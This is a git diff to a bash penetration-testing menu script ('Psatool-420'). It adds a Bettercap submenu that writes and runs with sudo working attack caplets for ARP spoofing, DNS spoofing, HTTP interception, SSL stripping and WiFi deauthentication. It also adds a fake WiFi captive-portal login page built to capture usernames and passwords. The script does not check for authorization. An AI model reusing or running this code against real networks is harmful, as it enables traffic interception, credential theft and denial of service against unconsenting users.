@@ -20,7 +20,8 @@ show_menu() {
     echo -e "\033[1;36m6)\033[0m \033[1;32mRun SQLMap\033[0m"
     echo -e "\033[1;36m7)\033[0m \033[1;32mRun Nikto\033[0m"
     echo -e "\033[1;36m8)\033[0m \033[1;32mOSINT Tools\033[0m"
-    echo -e "\033[1;36m9)\033[0m \033[1;31mExit\033[0m"
+    echo -e "\033[1;36m9)\033[0m \033[1;32mRun Bettercap\033[0m"
+    echo -e "\033[1;36m10)\033[0m \033[1;31mExit\033[0m"
     echo -e "\033[1;33m=====================================\033[0m"
     echo -n "Please choose an option: "
 }
@@ -952,6 +953,348 @@ run_osint() {
     run_osint
 }
 
+# Function to run Bettercap
+run_bettercap() {
+    echo -e "\n\033[1;34m=== Bettercap Network Tool ===\033[0m"
+    echo -e "\033[1;34mSelect Bettercap operation:\033[0m"
+    echo -e "\033[1;36m1)\033[0m \033[1;32mNetwork Reconnaissance (discover hosts)\033[0m"
+    echo -e "\033[1;36m2)\033[0m \033[1;32mARP Spoofing\033[0m"
+    echo -e "\033[1;36m3)\033[0m \033[1;32mDNS Spoofing\033[0m"
+    echo -e "\033[1;36m4)\033[0m \033[1;32mHTTP/HTTPS Proxy\033[0m"
+    echo -e "\033[1;36m5)\033[0m \033[1;32mSSL Strip Attack\033[0m"
+    echo -e "\033[1;36m6)\033[0m \033[1;32mCaptive Portal\033[0m"
+    echo -e "\033[1;36m7)\033[0m \033[1;32mWiFi Monitoring/Deauth\033[0m"
+    echo -e "\033[1;36m8)\033[0m \033[1;32mCustom Bettercap Command\033[0m"
+    echo -e "\033[1;36m9)\033[0m \033[1;31mBack to Main Menu\033[0m"
+    echo -n "Enter your choice: "
+    read bettercap_choice
+    
+    # Get network interface if needed
+    get_interface() {
+        # List available interfaces
+        echo -e "\033[1;34mAvailable interfaces:\033[0m"
+        ip -o link show | grep -v "lo" | awk -F': ' '{print $2}'
+        echo -e "\033[1;34mEnter interface name (e.g., eth0, wlan0):\033[0m"
+        read interface
+        
+        if [[ -z "$interface" ]]; then
+            echo -e "\033[1;31mInterface name required!\033[0m"
+            return 1
+        fi
+        return 0
+    }
+    
+    case $bettercap_choice in
+        1)
+            # Network Reconnaissance
+            if ! get_interface; then return; fi
+            
+            echo -e "\033[1;33m[*] Starting Bettercap network discovery...\033[0m"
+            echo -e "\033[1;33m[*] Press Ctrl+C to stop the scan when done.\033[0m"
+            echo -e "\033[1;33m[*] Commands: help, net.show\033[0m"
+            
+            # Create a basic caplet for host discovery
+            echo 'net.probe on' > /tmp/discover.cap
+            echo 'ticker on' >> /tmp/discover.cap
+            echo 'net.show' >> /tmp/discover.cap
+            
+            sudo bettercap -iface $interface -caplet /tmp/discover.cap
+            rm /tmp/discover.cap
+            ;;
+            
+        2)
+            # ARP Spoofing
+            if ! get_interface; then return; fi
+            
+            echo -e "\033[1;34mEnter target IP (leave empty for all hosts):\033[0m"
+            read target_ip
+            
+            echo -e "\033[1;34mEnter gateway IP (optional):\033[0m"
+            read gateway_ip
+            
+            # Create ARP spoofing caplet
+            echo 'net.probe on' > /tmp/arp_spoof.cap
+            echo 'set arp.spoof.internal true' >> /tmp/arp_spoof.cap
+            
+            if [[ ! -z "$target_ip" ]]; then
+                echo "set arp.spoof.targets $target_ip" >> /tmp/arp_spoof.cap
+            fi
+            
+            if [[ ! -z "$gateway_ip" ]]; then
+                echo "set arp.spoof.whitelist $gateway_ip" >> /tmp/arp_spoof.cap
+            fi
+            
+            echo 'arp.spoof on' >> /tmp/arp_spoof.cap
+            echo 'net.sniff on' >> /tmp/arp_spoof.cap
+            
+            echo -e "\033[1;33m[*] Starting ARP spoofing attack...\033[0m"
+            echo -e "\033[1;33m[*] Press Ctrl+C to stop the attack.\033[0m"
+            
+            sudo bettercap -iface $interface -caplet /tmp/arp_spoof.cap
+            rm /tmp/arp_spoof.cap
+            ;;
+            
+        3)
+            # DNS Spoofing
+            if ! get_interface; then return; fi
+            
+            echo -e "\033[1;34mEnter domain to spoof (e.g., example.com):\033[0m"
+            read spoof_domain
+            
+            echo -e "\033[1;34mEnter IP to redirect to:\033[0m"
+            read redirect_ip
+            
+            if [[ -z "$spoof_domain" || -z "$redirect_ip" ]]; then
+                echo -e "\033[1;31mBoth domain and redirect IP are required!\033[0m"
+                return
+            fi
+            
+            # Create DNS spoofing caplet
+            echo 'net.probe on' > /tmp/dns_spoof.cap
+            echo 'set arp.spoof.internal true' >> /tmp/dns_spoof.cap
+            echo 'arp.spoof on' >> /tmp/dns_spoof.cap
+            echo 'set dns.spoof.domains '$spoof_domain >> /tmp/dns_spoof.cap
+            echo 'set dns.spoof.address '$redirect_ip >> /tmp/dns_spoof.cap
+            echo 'dns.spoof on' >> /tmp/dns_spoof.cap
+            
+            echo -e "\033[1;33m[*] Starting DNS spoofing attack...\033[0m"
+            echo -e "\033[1;33m[*] Press Ctrl+C to stop the attack.\033[0m"
+            
+            sudo bettercap -iface $interface -caplet /tmp/dns_spoof.cap
+            rm /tmp/dns_spoof.cap
+            ;;
+            
+        4)
+            # HTTP/HTTPS Proxy
+            if ! get_interface; then return; fi
+            
+            echo -e "\033[1;34mEnter proxy port (default 8080):\033[0m"
+            read proxy_port
+            
+            if [[ -z "$proxy_port" ]]; then
+                proxy_port=8080
+            fi
+            
+            # Create HTTP proxy caplet
+            echo 'net.probe on' > /tmp/http_proxy.cap
+            echo 'set arp.spoof.internal true' >> /tmp/http_proxy.cap
+            echo 'arp.spoof on' >> /tmp/http_proxy.cap
+            echo "set http.proxy.port $proxy_port" >> /tmp/http_proxy.cap
+            echo 'http.proxy on' >> /tmp/http_proxy.cap
+            echo 'net.sniff on' >> /tmp/http_proxy.cap
+            
+            echo -e "\033[1;33m[*] Starting HTTP proxy on port $proxy_port...\033[0m"
+            echo -e "\033[1;33m[*] Press Ctrl+C to stop.\033[0m"
+            
+            sudo bettercap -iface $interface -caplet /tmp/http_proxy.cap
+            rm /tmp/http_proxy.cap
+            ;;
+            
+        5)
+            # SSL Strip Attack
+            if ! get_interface; then return; fi
+            
+            # Create SSL strip caplet
+            echo 'net.probe on' > /tmp/sslstrip.cap
+            echo 'set arp.spoof.internal true' >> /tmp/sslstrip.cap
+            echo 'arp.spoof on' >> /tmp/sslstrip.cap
+            echo 'set http.proxy.sslstrip true' >> /tmp/sslstrip.cap
+            echo 'http.proxy on' >> /tmp/sslstrip.cap
+            echo 'net.sniff on' >> /tmp/sslstrip.cap
+            
+            echo -e "\033[1;33m[*] Starting SSL strip attack...\033[0m"
+            echo -e "\033[1;33m[*] Press Ctrl+C to stop the attack.\033[0m"
+            
+            sudo bettercap -iface $interface -caplet /tmp/sslstrip.cap
+            rm /tmp/sslstrip.cap
+            ;;
+            
+        6)
+            # Captive Portal
+            if ! get_interface; then return; fi
+            
+            echo -e "\033[1;34mEnter portal title (default: Authentication Required):\033[0m"
+            read portal_title
+            
+            if [[ -z "$portal_title" ]]; then
+                portal_title="Authentication Required"
+            fi
+            
+            # Create a directory for storing credentials if it doesn't exist
+            mkdir -p results/captive_portal
+            
+            # Create captive portal caplet
+            echo 'net.probe on' > /tmp/captive_portal.cap
+            echo 'set arp.spoof.internal true' >> /tmp/captive_portal.cap
+            echo 'arp.spoof on' >> /tmp/captive_portal.cap
+            echo 'set http.proxy.sslstrip true' >> /tmp/captive_portal.cap
+            echo 'set http.server.path /tmp/www' >> /tmp/captive_portal.cap
+            echo "set http.server.title \"$portal_title\"" >> /tmp/captive_portal.cap
+            echo 'set http.server.address 0.0.0.0' >> /tmp/captive_portal.cap
+            echo 'http.proxy on' >> /tmp/captive_portal.cap
+            echo 'http.server on' >> /tmp/captive_portal.cap
+            echo 'net.sniff on' >> /tmp/captive_portal.cap
+            
+            # Create a simple web directory for the captive portal
+            mkdir -p /tmp/www
+            
+            # Create a simple HTML login page
+            cat > /tmp/www/index.html << EOF
+<!DOCTYPE html>
+<html>
+<head>
+    <title>$portal_title</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f0f0f0; }
+        .container { max-width: 400px; margin: 50px auto; padding: 20px; background: white; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h2 { color: #333; text-align: center; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #4285f4; color: white; border: none; border-radius: 3px; cursor: pointer; }
+        .error { color: red; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>WiFi Authentication</h2>
+        <p>Please sign in to access the internet</p>
+        <form method="POST" action="login.php">
+            <div class="error" id="error"></div>
+            <input type="text" name="username" placeholder="Username or Email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Sign In</button>
+        </form>
+    </div>
+</body>
+</html>
+EOF
+            
+            echo -e "\033[1;33m[*] Starting captive portal...\033[0m"
+            echo -e "\033[1;33m[*] Captured credentials will be logged by Bettercap.\033[0m"
+            echo -e "\033[1;33m[*] Press Ctrl+C to stop the attack.\033[0m"
+            
+            sudo bettercap -iface $interface -caplet /tmp/captive_portal.cap
+            
+            # Cleanup
+            rm /tmp/captive_portal.cap
+            rm -rf /tmp/www
+            ;;
+            
+        7)
+            # WiFi Monitoring/Deauth
+            echo -e "\033[1;34mEnter wireless interface in monitor mode (e.g., wlan0mon):\033[0m"
+            read wlan_interface
+            
+            if [[ -z "$wlan_interface" ]]; then
+                echo -e "\033[1;31mInterface required!\033[0m"
+                return
+            fi
+            
+            echo -e "\033[1;34mSelect operation:\033[0m"
+            echo -e "\033[1;36m1)\033[0m \033[1;32mWiFi network discovery\033[0m"
+            echo -e "\033[1;36m2)\033[0m \033[1;32mDeauthentication attack\033[0m"
+            echo -n "Enter your choice: "
+            read wifi_choice
+            
+            case $wifi_choice in
+                1)
+                    # WiFi discovery
+                    echo 'wifi.recon on' > /tmp/wifi_recon.cap
+                    echo 'ticker on' >> /tmp/wifi_recon.cap
+                    echo 'wifi.show' >> /tmp/wifi_recon.cap
+                    
+                    echo -e "\033[1;33m[*] Starting WiFi reconnaissance...\033[0m"
+                    echo -e "\033[1;33m[*] Press Ctrl+C to stop scanning.\033[0m"
+                    
+                    sudo bettercap -iface $wlan_interface -caplet /tmp/wifi_recon.cap
+                    rm /tmp/wifi_recon.cap
+                    ;;
+                    
+                2)
+                    # Deauth attack
+                    echo -e "\033[1;34mEnter target BSSID (MAC of AP):\033[0m"
+                    read target_bssid
+                    
+                    echo -e "\033[1;34mEnter client MAC (leave empty to deauth all clients):\033[0m"
+                    read client_mac
+                    
+                    if [[ -z "$target_bssid" ]]; then
+                        echo -e "\033[1;31mTarget BSSID required!\033[0m"
+                        return
+                    fi
+                    
+                    # Create deauth caplet
+                    echo 'wifi.recon on' > /tmp/wifi_deauth.cap
+                    
+                    if [[ -z "$client_mac" ]]; then
+                        echo "wifi.deauth $target_bssid" >> /tmp/wifi_deauth.cap
+                    else
+                        echo "wifi.deauth $target_bssid $client_mac" >> /tmp/wifi_deauth.cap
+                    fi
+                    
+                    echo -e "\033[1;33m[*] Starting deauthentication attack...\033[0m"
+                    echo -e "\033[1;33m[*] Press Ctrl+C to stop the attack.\033[0m"
+                    
+                    sudo bettercap -iface $wlan_interface -caplet /tmp/wifi_deauth.cap
+                    rm /tmp/wifi_deauth.cap
+                    ;;
+                    
+                *)
+                    echo -e "\033[1;31mInvalid choice!\033[0m"
+                    ;;
+            esac
+            ;;
+
+8)
+            # Custom Bettercap Command
+            if ! get_interface; then return; fi
+            
+            echo -e "\033[1;34mEnter custom Bettercap caplet commands (one per line, end with empty line):\033[0m"
+            echo -e "\033[1;33m[*] Examples: net.probe on, arp.spoof on, net.sniff on\033[0m"
+            
+            # Create temporary caplet file
+            > /tmp/custom_caplet.cap
+            
+            while true; do
+                read -p "> " custom_command
+                
+                # Break on empty line
+                if [[ -z "$custom_command" ]]; then
+                    break
+                fi
+                
+                echo "$custom_command" >> /tmp/custom_caplet.cap
+            done
+            
+            echo -e "\033[1;33m[*] Running custom Bettercap commands...\033[0m"
+            echo -e "\033[1;33m[*] Press Ctrl+C to stop.\033[0m"
+            
+            sudo bettercap -iface $interface -caplet /tmp/custom_caplet.cap
+            rm /tmp/custom_caplet.cap
+            ;;
+            
+        9)
+            # Return to main menu
+            echo -e "\033[1;33m[*] Returning to main menu...\033[0m"
+            return
+            ;;
+            
+        *)
+            echo -e "\033[1;31mInvalid choice!\033[0m"
+            ;;
+    esac
+    
+    # Ask if user wants to perform another Bettercap operation
+    echo -e "\n\033[1;34mDo you want to perform another Bettercap operation? (y/n):\033[0m"
+    read another_operation
+    
+    if [[ "$another_operation" == "y" || "$another_operation" == "Y" ]]; then
+        run_bettercap
+    else
+        echo -e "\033[1;33m[*] Returning to main menu...\033[0m"
+    fi
+}
+
 
 
 # Main execution loop
@@ -987,6 +1330,10 @@ case $choice in
         run_osint
         ;;
     9)
+        run_bettercap
+        ;;
+        
+    10)
         echo -e "\033[1;32m[*] Thank you for using Psatool-420!\033[0m"
         exit 0
         ;;
